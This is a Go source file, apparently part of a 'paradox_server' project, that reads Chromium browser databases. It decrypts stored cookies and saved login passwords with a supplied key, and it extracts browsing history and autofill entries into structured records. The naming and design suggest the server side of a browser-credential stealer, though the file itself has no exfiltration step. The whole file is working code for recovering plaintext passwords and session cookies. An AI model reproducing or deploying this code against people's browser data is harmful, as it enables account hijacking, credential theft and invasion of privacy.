package decode

import (
	"database/sql"
	"log"
	"paradox_server/crypto"
	"paradox_server/models"
	"paradox_server/static"

	_ "github.com/mattn/go-sqlite3"
)

func ChromeCookies(cookiesFile string, secretKey []byte, osType string) []models.Cookie {
	cookiesDB, _ := sql.Open("sqlite3", "file:"+cookiesFile)
	rows, _ := cookiesDB.Query(static.QueryChromiumCookie)

	var decryptedCookies []models.Cookie
	for rows.Next() {
		var (
			key, host, path                               string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			value, encryptValue                           []byte
		)

		_ = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent)

		cookie := models.Cookie{
			KeyName:      key,
			Host:         host,
			Path:         path,
			EncryptValue: encryptValue,
			IsSecure:     IntToBool(isSecure),
			IsHTTPOnly:   IntToBool(isHTTPOnly),
			HasExpire:    IntToBool(hasExpire),
			IsPersistent: IntToBool(isPersistent),
			CreateDate:   TimeEpochFormat(createDate),
			ExpireDate:   TimeEpochFormat(expireDate),
		}

		value, _ = crypto.DecryptChromeAES(secretKey, encryptValue, crypto.ChromeCookie)

		cookie.Value = string(value)

		decryptedCookies = append(decryptedCookies, cookie)
	}

	return decryptedCookies
}

func ChromeLoginData(loginDataFile string, secretKey []byte) []models.LoginData {
	var decryptedLogins []models.LoginData

	loginDB, err := sql.Open("sqlite3", "file:"+loginDataFile+"?immutable=1")
	if err != nil {
		log.Printf("Error opening login DB %s: %v", loginDataFile, err)
		return decryptedLogins
	}
	defer loginDB.Close()

	rows, err := loginDB.Query(static.QueryChromiumLogin)
	if err != nil {
		log.Printf("Error querying logins from %s: %v", loginDataFile, err)
		return decryptedLogins
	}
	defer rows.Close()

	for rows.Next() {
		var (
			originUrl, usernameValue string
			passwordValue            []byte
			dateCreated              int64
		)

		err = rows.Scan(&originUrl, &usernameValue, &passwordValue, &dateCreated)
		if err != nil {
			log.Printf("Error scanning login row from %s: %v", loginDataFile, err)
			continue
		}

		var dataToDecrypt []byte
		if len(passwordValue) > 3 {
			dataToDecrypt = passwordValue
		} else {
			if len(passwordValue) > 0 {
				log.Printf("Password blob unexpectedly short for %s (%s), length %d, skipping.", originUrl, usernameValue, len(passwordValue))
			}
			continue
		}

		decryptedPasswordBytes, err := crypto.DecryptChromeAES(secretKey, dataToDecrypt, crypto.ChromeLogin)
		if err != nil {
			log.Printf("Error decrypting password for %s (%s): %v", originUrl, usernameValue, err)
			continue
		}
		decryptedPassword := string(decryptedPasswordBytes)

		if decryptedPassword == "" && len(passwordValue) > 0 {
			log.Printf("Decryption resulted in empty password for %s (%s), skipping.", originUrl, usernameValue)
			continue
		}

		login := models.LoginData{
			LoginURL:   originUrl,
			Username:   usernameValue,
			Password:   decryptedPassword,
			CreateDate: dateCreated,
		}

		decryptedLogins = append(decryptedLogins, login)
	}

	if err = rows.Err(); err != nil {
		log.Printf("Error iterating login rows from %s: %v", loginDataFile, err)
	}

	return decryptedLogins
}

func ChromeHistory(historyFile string) []models.HistoryEntry {
	var history []models.HistoryEntry

	historyDB, err := sql.Open("sqlite3", "file:"+historyFile+"?immutable=1")
	if err != nil {
		log.Printf("Error opening history DB %s: %v", historyFile, err)
		return history
	}
	defer historyDB.Close()

	rows, err := historyDB.Query(static.QueryChromiumHistory)
	if err != nil {
		log.Printf("Error querying history from %s: %v", historyFile, err)
		return history
	}
	defer rows.Close()

	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
			typedCount    int
			hidden        int
		)

		err = rows.Scan(&url, &title, &visitCount, &lastVisitTime, &typedCount, &hidden)
		if err != nil {
			log.Printf("Error scanning history row from %s: %v", historyFile, err)
			continue
		}

		entry := models.HistoryEntry{
			URL:        url,
			Title:      title,
			VisitCount: visitCount,
			LastVisit:  TimeEpochFormat(lastVisitTime),
			TypedCount: typedCount,
			Hidden:     IntToBool(hidden),
		}

		history = append(history, entry)
	}

	if err = rows.Err(); err != nil {
		log.Printf("Error iterating history rows from %s: %v", historyFile, err)
	}

	return history
}

func ChromeWebData(webDataFile string) []models.WebDataEntry {
	var webData []models.WebDataEntry

	webDB, err := sql.Open("sqlite3", "file:"+webDataFile+"?immutable=1")
	if err != nil {
		log.Printf("Error opening web data DB %s: %v", webDataFile, err)
		return webData
	}
	defer webDB.Close()

	rows, err := webDB.Query(static.QueryChromiumWebData)
	if err != nil {
		log.Printf("Error querying web data from %s: %v", webDataFile, err)
		return webData
	}
	defer rows.Close()

	for rows.Next() {
		var (
			name, value  string
			dateCreated  int64
			dateLastUsed int64
			count        int
			formDataType int
		)

		err = rows.Scan(&name, &value, &dateCreated, &dateLastUsed, &count, &formDataType)
		if err != nil {
			log.Printf("Error scanning web data row from %s: %v", webDataFile, err)
			continue
		}

		entry := models.WebDataEntry{
			Name:         name,
			Value:        value,
			DateCreated:  TimeEpochFormat(dateCreated),
			DateLastUsed: TimeEpochFormat(dateLastUsed),
			Count:        count,
			FormDataType: formDataType,
		}

		webData = append(webData, entry)
	}

	if err = rows.Err(); err != nil {
		log.Printf("Error iterating web data rows from %s: %v", webDataFile, err)
	}

	return webData
}
